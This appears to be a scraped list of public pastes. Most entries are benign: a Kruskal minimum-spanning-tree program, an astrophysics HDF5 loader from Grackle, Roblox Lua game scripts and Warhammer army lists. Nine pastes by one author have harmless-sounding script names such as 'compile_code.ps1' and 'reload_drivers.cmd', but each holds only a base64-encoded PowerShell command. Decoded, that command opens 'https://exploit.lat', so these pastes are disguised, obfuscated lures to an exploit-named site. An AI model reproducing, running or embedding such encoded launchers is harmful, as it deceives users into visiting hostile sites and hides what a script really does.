			dsu.unite(con[i].a, con[i].b);
			cost+=con[i].cost;
		}
	}
	cout << cost << '\n';
	
	return 0;
}
"
5wi1MN1a,compile_code.ps1,amtaidan,Batch,Saturday 7th of June 2025 01:24:14 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AMwA0ADMAZAA3ADEAZgBkAA==

RIzIpz"
XvK3mmvC,Untitled,swaggboi,Bash,Saturday 7th of June 2025 01:21:56 PM CDT,"$ (cd $HOME/git/pomm/ && ./pomm.pl)
Could not complete request: 403 Forbidden at /usr/share/perl5/Mastodon/Role/UserAgent.pm line 147.
 at /usr/share/perl5/Mastodon/Role/UserAgent.pm line 173."
m0wwUvas,reformatted initialize_cloudy_data.c,mabruzzo,C,Saturday 7th of June 2025 01:14:31 PM CDT,"/***********************************************************************
/
/ Initialize Cloudy cooling data
/
/
/ Copyright (c) 2013, Enzo/Grackle Development Team.
/
/ Distributed under the terms of the Enzo Public Licence.
/
/ The full license is in the file LICENSE, distributed with this
/ software.
************************************************************************/

#include <stdlib.h>
#include <string.h>
#include <math.h>
#include ""hdf5.h""
#include ""grackle.h""
#include ""grackle_macros.h""
#include ""grackle_types.h""
#include ""grackle_chemistry_data.h""

#define SMALL_LOG_VALUE -99.0

extern int grackle_verbose;

/**
 * Initializes an empty #cloudy_data struct with zeros and NULLs.
 */
void initialize_empty_cloudy_data_struct(cloudy_data* my_cloudy) {
  my_cloudy->grid_rank = 0LL;
  for (long long i = 0; i < GRACKLE_CLOUDY_TABLE_MAX_DIMENSION; i++) {
    my_cloudy->grid_dimension[i] = 0LL;
    my_cloudy->grid_parameters[i] = NULL;
  }
  my_cloudy->heating_data = NULL;
  my_cloudy->cooling_data = NULL;
  my_cloudy->mmw_data = NULL;
  my_cloudy->data_size = 0LL;
}

// Initialize Cloudy cooling data
int initialize_cloudy_data(chemistry_data* my_chemistry,
                           chemistry_data_storage* my_rates,
                           cloudy_data* my_cloudy, char* group_name,
                           code_units* my_units, int read_data) {
  long long q, w;
  double* temp_data;
  long long temp_int;
  long long* temp_int_arr;
  char parameter_name[MAX_LINE_LENGTH];

  // Initialize things (to the null-state) even if cloudy cooling is not used.
  initialize_empty_cloudy_data_struct(my_cloudy);

  if (read_data == 0) {
    return SUCCESS;
  }

  if (grackle_verbose) {
    fprintf(stdout, ""Initializing Cloudy cooling: %s.\n"", group_name);
    fprintf(stdout, ""cloudy_table_file: %s.\n"",
            my_chemistry->grackle_data_file);
  }

  /* Get conversion units. */

  double co_length_units, co_density_units;
  if (my_units->comoving_coordinates == TRUE) {
    co_length_units = my_units->length_units;
    co_density_units = my_units->density_units;
  } else {
    co_length_units =
        my_units->length_units * my_units->a_value * my_units->a_units;
    co_density_units =
        my_units->density_units / POW(my_units->a_value * my_units->a_units, 3);
  }

  double tbase1 = my_units->time_units;
  double xbase1 = co_length_units / (my_units->a_value * my_units->a_units);
  double dbase1 =
      co_density_units * POW(my_units->a_value * my_units->a_units, 3);
  double mh = 1.67e-24;
  double CoolUnit = (POW(my_units->a_units, 5) * POW(xbase1, 2) * POW(mh, 2)) /
                    (POW(tbase1, 3) * dbase1);

  // Read cooling data in from hdf5 file.
  hid_t file_id, dset_id, attr_id;
  herr_t status;
  herr_t h5_error = -1;

  file_id =
      H5Fopen(my_chemistry->grackle_data_file, H5F_ACC_RDONLY, H5P_DEFAULT);

  if (H5Aexists(file_id, ""old_style"")) {
    my_rates->cloudy_data_new = 0;
    if (grackle_verbose) fprintf(stdout, ""Loading old-style Cloudy tables.\n"");
  }

  // Open cooling dataset and get grid dimensions.

  sprintf(parameter_name, ""/CoolingRates/%s/Cooling"", group_name);
  dset_id = H5Dopen(file_id, parameter_name);
  if (dset_id == h5_error) {
    fprintf(stderr, ""Can't open Cooling in %s.\n"",
            my_chemistry->grackle_data_file);
    return FAIL;
  }

  // Grid rank.
  attr_id = H5Aopen_name(dset_id, ""Rank"");
  if (attr_id == h5_error) {
    fprintf(stderr, ""Failed to open Rank attribute in Cooling dataset.\n"");
    return FAIL;
  }
  status = H5Aread(attr_id, HDF5_I8, &temp_int);
  if (attr_id == h5_error) {
    fprintf(stderr, ""Failed to read Rank attribute in Cooling dataset.\n"");
    return FAIL;
  }
  my_cloudy->grid_rank = (long long)temp_int;
  if (grackle_verbose)
    fprintf(stdout, ""Cloudy cooling grid rank: %lld.\n"", my_cloudy->grid_rank);
  status = H5Aclose(attr_id);
  if (attr_id == h5_error) {
    fprintf(stderr, ""Failed to close Rank attribute in Cooling dataset.\n"");
    return FAIL;
  }

  // Grid dimension.
  temp_int_arr = malloc(my_cloudy->grid_rank * sizeof(long long));
  attr_id = H5Aopen_name(dset_id, ""Dimension"");
  if (attr_id == h5_error) {
    fprintf(stderr, ""Failed to open Dimension attribute in Cooling dataset.\n"");
    return FAIL;
  }
  status = H5Aread(attr_id, HDF5_I8, temp_int_arr);
  if (attr_id == h5_error) {
    fprintf(stderr, ""Failed to read Dimension attribute in Cooling dataset.\n"");
    return FAIL;
  }
  if (grackle_verbose) fprintf(stdout, ""Cloudy cooling grid dimensions:"");
  for (q = 0; q < my_cloudy->grid_rank; q++) {
    my_cloudy->grid_dimension[q] = (long long)temp_int_arr[q];
    if (grackle_verbose) fprintf(stdout, "" %lld"", my_cloudy->grid_dimension[q]);
  }
  if (grackle_verbose) fprintf(stdout, "".\n"");
  status = H5Aclose(attr_id);
  if (attr_id == h5_error) {
    fprintf(stderr,
            ""Failed to close Dimension attribute in Cooling dataset.\n"");
    return FAIL;
  }
  free(temp_int_arr);

  // Grid parameters.
  for (q = 0; q < my_cloudy->grid_rank; q++) {
    if (q < my_cloudy->grid_rank - 1) {
      sprintf(parameter_name, ""Parameter%lld"", (q + 1));
    } else {
      sprintf(parameter_name, ""Temperature"");
    }

    temp_data = malloc(my_cloudy->grid_dimension[q] * sizeof(double));

    attr_id = H5Aopen_name(dset_id, parameter_name);
    if (attr_id == h5_error) {
      fprintf(stderr, ""Failed to open %s attribute in Cooling dataset.\n"",
              parameter_name);
      return FAIL;
    }
    status = H5Aread(attr_id, HDF5_R8, temp_data);
    if (attr_id == h5_error) {
      fprintf(stderr, ""Failed to read %s attribute in Cooling dataset.\n"",
              parameter_name);
      return FAIL;
    }

    my_cloudy->grid_parameters[q] =
        malloc(my_cloudy->grid_dimension[q] * sizeof(double));
    for (w = 0; w < my_cloudy->grid_dimension[q]; w++) {
      if (q < my_cloudy->grid_rank - 1) {
        my_cloudy->grid_parameters[q][w] = (double)temp_data[w];
      } else {
        // convert temeperature to log
        my_cloudy->grid_parameters[q][w] = (double)log10(temp_data[w]);
      }
    }
    if (grackle_verbose)
      fprintf(stdout, ""%s: %"" GSYM "" to %"" GSYM "" (%lld steps).\n"",
              parameter_name, my_cloudy->grid_parameters[q][0],
              my_cloudy->grid_parameters[q][my_cloudy->grid_dimension[q] - 1],
              my_cloudy->grid_dimension[q]);
    status = H5Aclose(attr_id);
    if (attr_id == h5_error) {
      fprintf(stderr, ""Failed to close %s attribute in Cooling dataset.\n"",
              parameter_name);
      return FAIL;
    }
    free(temp_data);
  }

  // Read Cooling data.
  my_cloudy->data_size = 1;
  for (q = 0; q < my_cloudy->grid_rank; q++) {
    my_cloudy->data_size *= my_cloudy->grid_dimension[q];
  }
  temp_data = malloc(my_cloudy->data_size * sizeof(double));

  status = H5Dread(dset_id, HDF5_R8, H5S_ALL, H5S_ALL, H5P_DEFAULT, temp_data);
  if (grackle_verbose) fprintf(stdout, ""Reading Cloudy Cooling dataset.\n"");
  if (status == h5_error) {
    fprintf(stderr, ""Failed to read Cooling dataset.\n"");
    return FAIL;
  }

  my_cloudy->cooling_data = malloc(my_cloudy->data_size * sizeof(double));
  for (q = 0; q < my_cloudy->data_size; q++) {
    my_cloudy->cooling_data[q] = temp_data[q] > 0 ? (double)log10(temp_data[q])
                                                  : (double)SMALL_LOG_VALUE;

    // Convert to code units.
    my_cloudy->cooling_data[q] -= log10(CoolUnit);
  }
  free(temp_data);

  status = H5Dclose(dset_id);
  if (status == h5_error) {
    fprintf(stderr, ""Failed to close Cooling dataset.\n"");
    return FAIL;
  }

  // Read Heating data.
  if (my_chemistry->UVbackground == 1) {
    temp_data = malloc(my_cloudy->data_size * sizeof(double));

    sprintf(parameter_name, ""/CoolingRates/%s/Heating"", group_name);
    dset_id = H5Dopen(file_id, parameter_name);
    if (dset_id == h5_error) {
      fprintf(stderr, ""Can't open Heating in %s.\n"",
              my_chemistry->grackle_data_file);
      return FAIL;
    }

    status =
        H5Dread(dset_id, HDF5_R8, H5S_ALL, H5S_ALL, H5P_DEFAULT, temp_data);
    if (grackle_verbose) fprintf(stdout, ""Reading Cloudy Heating dataset.\n"");
    if (status == h5_error) {
      fprintf(stderr, ""Failed to read Heating dataset.\n"");
      return FAIL;
    }

    my_cloudy->heating_data = malloc(my_cloudy->data_size * sizeof(double));
    for (q = 0; q < my_cloudy->data_size; q++) {
      my_cloudy->heating_data[q] = temp_data[q] > 0
                                       ? (double)log10(temp_data[q])
                                       : (double)SMALL_LOG_VALUE;

      // Convert to code units.
      my_cloudy->heating_data[q] -= log10(CoolUnit);
    }
    free(temp_data);

    status = H5Dclose(dset_id);
    if (status == h5_error) {
      fprintf(stderr, ""Failed to close Heating dataset.\n"");
      return FAIL;
    }
  }

  // Read MMW data.
  if (my_chemistry->primordial_chemistry == 0 &&
      strcmp(group_name, ""Primordial"") == 0) {
    my_cloudy->mmw_data = malloc(my_cloudy->data_size * sizeof(double));

    sprintf(parameter_name, ""/CoolingRates/%s/MMW"", group_name);
    dset_id = H5Dopen(file_id, parameter_name);
    if (dset_id == h5_error) {
      fprintf(stderr, ""Can't open MMW in %s.\n"",
              my_chemistry->grackle_data_file);
      return FAIL;
    }

    status = H5Dread(dset_id, HDF5_R8, H5S_ALL, H5S_ALL, H5P_DEFAULT,
                     my_cloudy->mmw_data);
    if (grackle_verbose) fprintf(stdout, ""Reading Cloudy MMW dataset.\n"");
    if (status == h5_error) {
      fprintf(stderr, ""Failed to read MMW dataset.\n"");
      return FAIL;
    }

    status = H5Dclose(dset_id);
    if (status == h5_error) {
      fprintf(stderr, ""Failed to close MMW dataset.\n"");
      return FAIL;
    }
  }

  status = H5Fclose(file_id);

  if (my_cloudy->grid_rank > GRACKLE_CLOUDY_TABLE_MAX_DIMENSION) {
    fprintf(stderr,
            ""Error: rank of Cloudy cooling data must be less than or equal to ""
            ""%d.\n"",
            GRACKLE_CLOUDY_TABLE_MAX_DIMENSION);
    return FAIL;
  }

  return SUCCESS;
}

int _free_cloudy_data(cloudy_data* my_cloudy, chemistry_data* my_chemistry,
                      int primordial) {
  int i;

  for (i = 0; i < my_cloudy->grid_rank; i++) {
    GRACKLE_FREE(my_cloudy->grid_parameters[i]);
  }

  GRACKLE_FREE(my_cloudy->cooling_data);
  if (my_chemistry->UVbackground == 1) {
    GRACKLE_FREE(my_cloudy->heating_data);
  }
  if (my_chemistry->primordial_chemistry == 0 && primordial) {
    GRACKLE_FREE(my_cloudy->mmw_data);
  }
  return GR_SUCCESS;
}
"
HeC6mUYJ,validate_schema.ps1,amtaidan,Batch,Saturday 7th of June 2025 01:14:13 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AMQBmADUAYgA4ADMAZQA3AA==

altqwH"
fFfzaUmF,HandleDamageServer,BoblokDevelopyyyr,Lua,Saturday 7th of June 2025 01:09:56 PM CDT,"local RS = game:GetService(""ReplicatedStorage"")
local events = RS.Events
local dealDamageEvent = events.DealDamage
local module = require(game.ServerScriptService.Stats)
local dmg = 0

dealDamageEvent.OnServerEvent:Connect(function(player)
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass(""Humanoid"")
	local arm = character:FindFirstChild(""Right Arm"")::BasePart
	
	for _, child in ipairs(character:GetChildren()) do
		if child:IsA(""Tool"") then
			print(child.Name)
			print(module[child.Name])
			dmg = module[child.Name]
		end
	end

	local db = false

		arm.Touched:Connect(function(hitObject)
			if not db then
				local hitHum = hitObject.Parent:FindFirstChildOfClass(""Humanoid"")
				if hitHum then
					hitHum:TakeDamage(dmg)
					db = true

				else
					db = true
				end
			end
		end)
end)"
6Cd3FFGB,HandleSmackGivingServer,BoblokDevelopyyyr,Lua,Saturday 7th of June 2025 01:09:37 PM CDT,"local rs = game:GetService(""ReplicatedStorage"")
local hands = rs.Hands

game.Players.PlayerAdded:Connect(function(player)
	task.wait(5)

	local cloneBasic = hands.Normal:Clone()
	cloneBasic.Parent = player.Backpack
	print(cloneBasic.Parent)
end)

"
RUYKXuQy,ClientHandler,BoblokDevelopyyyr,Lua,Saturday 7th of June 2025 01:09:10 PM CDT,"local UIS = game:GetService(""UserInputService"")
local RS = game:GetService(""ReplicatedStorage"")
local events = RS.Events
local playAnimationEvent = events.PlayAnimation
local dealDamageEvent = events.DealDamage

local player = game.Players.LocalPlayer
local charater = player.Character or player.CharacterAdded:Wait()
local hand = charater:FindFirstChild(""Right Arm"")::BasePart

local db = false

local function onInput(input, gameProcessedEvent)
	if not gameProcessedEvent and not db then
		if input.KeyCode == Enum.KeyCode.E then
			
			task.spawn(function()
				db = true
				task.wait(3)
				db = false
			end)
			
			print(""Smacked!"")
			playAnimationEvent:FireServer()
			dealDamageEvent:FireServer()
		end
	end
end

UIS.InputBegan:Connect(onInput)"
uyJbhvUF,Stats,BoblokDevelopyyyr,Lua,Saturday 7th of June 2025 01:08:55 PM CDT,"local module = {
	Normal = 25,
	Big = 35,
	Fire = 10,
	Freeze = 10,
	Slowing = 10
}

return module
"
5AmXLs20,HandleAnimServer,BoblokDevelopyyyr,Lua,Saturday 7th of June 2025 01:08:36 PM CDT,"local RS = game:GetService(""ReplicatedStorage"")
local events = RS.Events
local playAnimationEvent = events.PlayAnimation
local anims = RS.Anims
local slapAnim = anims.Slap

playAnimationEvent.OnServerEvent:Connect(function(player)
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass(""Humanoid"")
	local animator = humanoid:FindFirstChildOfClass(""Animator"")
	
	local track = animator:LoadAnimation(slapAnim)
	track:Play()
end)"
1Gf1a7YU,extract_archive.bat,amtaidan,Batch,Saturday 7th of June 2025 01:04:13 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AMQA0ADkAZABjADEANAA3AA==

Q10bWj"
VPmJX600,reload_drivers.cmd,amtaidan,Batch,Saturday 7th of June 2025 12:54:12 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AOAAxAGEAYgBhAGUAMAA3AA==

r1wY6I"
hiY3Pfzt,WE,TableTopLive,PHP,Saturday 7th of June 2025 12:48:26 PM CDT,"The Bloody Blender (1990 points)

World Eaters
Strike Force (2000 points)
Khorne Daemonkin


CHARACTERS

KhÃ¢rn the Betrayer (85 points)
â€¢ 1x Gorechild
1x Plasma pistol

Lord on Juggernaut (105 points)
â€¢ Warlord
â€¢ 1x Bladed horn
1x Exalted chainblade
1x Plasma pistol
â€¢ Enhancement: Disciple of Khorne

Skarbrand (305 points)
â€¢ 1x Bellow of endless fury
1x Slaughter and Carnage

Slaughterbound (115 points)
â€¢ 1x Lacerator and daemonic claw
â€¢ Enhancement: Blade of Endless Bloodshed


BATTLELINE

Bloodletters (90 points)
â€¢ 1x Bloodreaper
â€¢ 1x Hellblade
â€¢ 9x Bloodletter
â€¢ 1x Daemonic Icon
9x Hellblade
1x Instrument of Chaos

Bloodletters (90 points)
â€¢ 1x Bloodreaper
â€¢ 1x Hellblade
â€¢ 9x Bloodletter
â€¢ 1x Daemonic Icon
9x Hellblade
1x Instrument of Chaos

Bloodletters (90 points)
â€¢ 1x Bloodreaper
â€¢ 1x Hellblade
â€¢ 9x Bloodletter
â€¢ 1x Daemonic Icon
9x Hellblade
1x Instrument of Chaos


OTHER DATASHEETS

Bloodcrushers (220 points)
â€¢ 1x Bloodhunter
â€¢ 1x Hellblade
1x Juggernautâ€™s bladed horn
â€¢ 5x Bloodcrusher
â€¢ 1x Daemonic Icon
5x Hellblade
1x Instrument of Chaos
5x Juggernautâ€™s bladed horn

Chaos Spawn (80 points)
â€¢ 2x Chaos Spawn
â€¢ 2x Hideous mutations

Flesh Hounds (75 points)
â€¢ 1x Gore Hound
â€¢ 1x Burning roar
1x Collar of Khorne
1x Gore-drenched fangs
â€¢ 4x Flesh Hound
â€¢ 4x Collar of Khorne
4x Gore-drenched fangs

Flesh Hounds (75 points)
â€¢ 1x Gore Hound
â€¢ 1x Burning roar
1x Collar of Khorne
1x Gore-drenched fangs
â€¢ 4x Flesh Hound
â€¢ 4x Collar of Khorne
4x Gore-drenched fangs

Forgefiend (150 points)
â€¢ 3x Ectoplasma cannon
1x Forgefiend claws

Forgefiend (150 points)
â€¢ 3x Ectoplasma cannon
1x Forgefiend claws

Helbrute (120 points)
â€¢ 1x Close combat weapon
1x Heavy flamer
1x Helbrute fist
1x Helbrute hammer

Helbrute (120 points)
â€¢ 1x Close combat weapon
1x Heavy flamer
1x Helbrute fist
1x Helbrute hammer

Helbrute (120 points)
â€¢ 1x Close combat weapon
1x Heavy flamer
1x Helbrute fist
1x Helbrute hammer
"
C9EpTYHp,DG,TableTopLive,PHP,Saturday 7th of June 2025 12:48:11 PM CDT,"The Stank Tanks (2000 points)

Death Guard
Strike Force (2000 points)
Mortarionâ€™s Hammer


CHARACTERS

Lord of Contagion (110 points)
â€¢ 1x Manreaper

Lord of Virulence (110 points)
â€¢ 1x Power fist
1x Twin plague spewer
â€¢ Enhancement: Tendrilous Emissions

Lord of Virulence (90 points)
â€¢ 1x Power fist
1x Twin plague spewer

Mortarion (380 points)
â€¢ Warlord
â€¢ 1x Lantern
1x Rotwind
1x Silence


OTHER DATASHEETS

Chaos Predator Destructor (145 points)
â€¢ 1x Armoured tracks
1x Combi-bolter
1x Havoc launcher
2x Lascannon
1x Predator autocannon

Deathshroud Terminators (140 points)
â€¢ 1x Deathshroud Champion
â€¢ 1x Icon of Despair (Aura)
1x Manreaper
2x Plaguespurt gauntlet
â€¢ 2x Deathshroud Terminator
â€¢ 2x Manreaper
2x Plaguespurt gauntlet

Deathshroud Terminators (140 points)
â€¢ 1x Deathshroud Champion
â€¢ 1x Icon of Despair (Aura)
1x Manreaper
2x Plaguespurt gauntlet
â€¢ 2x Deathshroud Terminator
â€¢ 2x Manreaper
2x Plaguespurt gauntlet

Foetid Bloat-Drone with Heavy Blight Launcher (100 points)
â€¢ 1x Heavy blight launcher
1x Plague probe

Foetid Bloat-Drone with Heavy Blight Launcher (100 points)
â€¢ 1x Heavy blight launcher
1x Plague probe

Foetid Bloat-Drone with Heavy Blight Launcher (100 points)
â€¢ 1x Heavy blight launcher
1x Plague probe

Plagueburst Crawler (195 points)
â€¢ 1x Armoured tracks
2x Entropy cannon
1x Heavy slugger
1x Plagueburst mortar

Plagueburst Crawler (195 points)
â€¢ 1x Armoured tracks
2x Entropy cannon
1x Heavy slugger
1x Plagueburst mortar

Plagueburst Crawler (195 points)
â€¢ 1x Armoured tracks
2x Entropy cannon
1x Heavy slugger
1x Plagueburst mortar"
0WMqGgvZ,list_services.ps1,amtaidan,Batch,Saturday 7th of June 2025 12:43:40 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AMQAyAGYAYQAyADEAZgBiAA==

gMFm6p"
D162zX2r,Kruskal,tepyotin2,C++,Saturday 7th of June 2025 12:43:07 PM CDT,"#include <bits/stdc++.h>

using namespace std;

typedef long long ll;

struct DSU{
	vector<int> parent;
	DSU(int n){
		parent = vector<int>(n, -1);
	}
	int get(int x){
		if(parent[x]<0){
			return x;
		}else{
			return parent[x] = get(parent[x]);
		}
	}
	bool same_set(int a, int b){
		return get(a) == get(b);
	};
	bool unite(int x, int y){
		x = get(x);
		y = get(y);
		if(same_set(x, y)) return false;
		if(parent[x]>parent[y]){
			swap(x, y);
		}
		parent[x]+=parent[y];
		parent[y] = x;
		return true;
	}
};

struct Path{
	int a, b;
	ll weight;
	bool operator<(const Path &v) const{
		return weight<v.weight;
	}
};

int n, m;
vector<Path> paths;
ll mst;

int main(){
	//freopen(""kruskal.in"", ""r"", stdin);
	
	cin >> n >> m;
	paths.resize(m);
	for(int i=0; i<m; i++){
		cin >> paths[i].a >> paths[i].b >> paths[i].weight;
	}
	sort(paths.begin(), paths.end());
	DSU dsu(n+1);
	for(int i=0; i<m; i++){
		if(!dsu.same_set(paths[i].a, paths[i].b)){
			dsu.unite(paths[i].a, paths[i].b);
			mst+=paths[i].weight;
		}
	}
	cout << mst << '\n';
	
	return 0;
}

"
5FvaVPuH,first c code,fvuar,C,Saturday 7th of June 2025 12:42:57 PM CDT,"/* 
==========================
2025/06/07

My first c codes
==========================
 */

#include <stdio.h>

int main(void)
{
	printf(""Hello, dear reader!\n"");
}"
NCtgSQfn,halt_operations.bat,amtaidan,Batch,Saturday 7th of June 2025 12:33:39 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AZgBkAGEAOQBkADAAZQBkAA==

qIdwAN"
ZuSmS0YG,upgrade_modules.bat,amtaidan,Batch,Saturday 7th of June 2025 12:23:39 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0ANQA3ADYAOQBlAGMANgBlAA==

q64ASf"
